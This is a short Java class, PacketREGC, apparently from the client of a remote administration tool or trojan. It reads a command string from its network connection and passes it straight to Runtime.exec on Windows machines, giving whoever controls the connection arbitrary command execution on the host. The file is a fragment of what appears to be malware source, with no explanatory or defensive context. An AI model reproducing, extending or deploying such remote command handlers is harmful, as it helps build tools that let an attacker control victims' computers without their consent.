package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;

public class PacketREGC extends Packet {

	@Override
	public void read(String line) throws Exception {
		String cmd = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}